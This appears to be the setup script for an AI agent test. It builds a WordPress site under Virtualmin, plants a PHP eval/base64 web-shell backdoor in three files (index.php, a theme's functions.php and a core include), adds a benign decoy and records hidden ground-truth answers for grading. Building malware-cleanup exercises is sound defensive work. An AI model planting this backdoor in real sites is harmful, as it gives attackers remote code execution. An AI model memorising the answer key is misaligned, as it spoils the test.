#!/bin/bash
set -e
echo "=== Setting up Quarantine Task ==="

# Source shared utilities
source /workspace/scripts/task_utils.sh

# Record task start time
date +%s > /tmp/task_start_time.txt

# Ensure Virtualmin services are running
/workspace/scripts/setup_virtualmin.sh

# ------------------------------------------------------------------
# 1. Create the victim virtual server if not exists
# ------------------------------------------------------------------
if ! virtualmin list-domains --name-only | grep -q "^greenleaf.test$"; then
    echo "Creating greenleaf.test virtual server..."
    virtualmin create-domain \
        --domain greenleaf.test \
        --pass "GreenLeaf123!" \
        --unix --dir --web --dns --mysql \
        --plan "Default Plan" 2>&1 | tail -5
else
    echo "greenleaf.test already exists"
fi

DOCROOT="/home/greenleaf/public_html"

# ------------------------------------------------------------------
# 2. Deploy Real WordPress (Real Data)
# ------------------------------------------------------------------
# We check for a core file to avoid re-downloading
if [ ! -f "$DOCROOT/wp-settings.php" ]; then
    echo "Downloading WordPress..."
    # Download specific version for consistency
    wget -q -O /tmp/wp.tar.gz https://wordpress.org/wordpress-6.4.3.tar.gz
    
    # Extract
    tar -xzf /tmp/wp.tar.gz -C /tmp
    
    # Clean docroot (remove index.html created by Virtualmin)
    rm -f "$DOCROOT/index.html"
    
    # Move contents to docroot
    cp -r /tmp/wordpress/* "$DOCROOT/"
    rm -rf /tmp/wordpress /tmp/wp.tar.gz
    
    # Create a dummy config so it looks "installed"
    cp "$DOCROOT/wp-config-sample.php" "$DOCROOT/wp-config.php"
    
    # Fix permissions
    chown -R greenleaf:greenleaf "$DOCROOT"
fi

# ------------------------------------------------------------------
# 3. Create Quarantine Directory
# ------------------------------------------------------------------
mkdir -p /root/quarantine
# Ensure it's empty to start
rm -rf /root/quarantine/*
echo "Quarantine directory ready at /root/quarantine"

# ------------------------------------------------------------------
# 4. Inject Malware (The "Needle")
# ------------------------------------------------------------------
MALWARE_PAYLOAD="<?php /* SILENCE IS GOLDEN */ if(isset(\$_POST['x'])){eval(base64_decode(\$_POST['x']));} ?>"

echo "Injecting malware..."

# Infection 1: Root index.php (Top level, easy to find)
if ! grep -q "SILENCE IS GOLDEN" "$DOCROOT/index.php"; then
    echo "$MALWARE_PAYLOAD" >> "$DOCROOT/index.php"
fi

# Infection 2: Theme functions (Deeply nested)
THEME_DIR="$DOCROOT/wp-content/themes/twentytwentythree"
mkdir -p "$THEME_DIR"
if [ ! -f "$THEME_DIR/functions.php" ]; then
    echo "<?php " > "$THEME_DIR/functions.php"
fi
if ! grep -q "SILENCE IS GOLDEN" "$THEME_DIR/functions.php"; then
    echo "$MALWARE_PAYLOAD" >> "$THEME_DIR/functions.php"
fi

# Infection 3: Core include (Hidden in system files)
if ! grep -q "SILENCE IS GOLDEN" "$DOCROOT/wp-includes/class-wp-http.php"; then
    echo "$MALWARE_PAYLOAD" >> "$DOCROOT/wp-includes/class-wp-http.php"
fi

# ------------------------------------------------------------------
# 5. Create Decoy (The "False Positive")
# ------------------------------------------------------------------
DECOY_FILE="$DOCROOT/wp-content/plugins/akismet/class.akismet.php"
mkdir -p "$(dirname "$DECOY_FILE")"
cat <<EOF > "$DECOY_FILE"
<?php
class Akismet {
    public function decode_params(\$data) {
        // This is safe code - base64_decode without eval
        return base64_decode(\$data);
    }
}
?>
EOF

# Ensure all files are owned by user
chown -R greenleaf:greenleaf "$DOCROOT"

# Record file info for verification (hidden from agent)
echo "$DOCROOT/index.php" > /tmp/ground_truth_infected.txt
echo "$THEME_DIR/functions.php" >> /tmp/ground_truth_infected.txt
echo "$DOCROOT/wp-includes/class-wp-http.php" >> /tmp/ground_truth_infected.txt
echo "$DECOY_FILE" > /tmp/ground_truth_decoy.txt

# ------------------------------------------------------------------
# 6. Launch Firefox focused on Virtualmin
# ------------------------------------------------------------------
echo "Launching Firefox..."
ensure_virtualmin_ready

# Navigate specifically to the File Manager for this domain if possible,
# or just the domain dashboard to save the agent one step
DOMAIN_ID=$(virtualmin list-domains --domain greenleaf.test --id-only)
navigate_to "https://localhost:10000/virtual-server/index.cgi?dom=${DOMAIN_ID}"

# Take initial screenshot
echo "Capturing initial state..."
sleep 2
take_screenshot /tmp/task_initial.png

echo "=== Setup complete ==="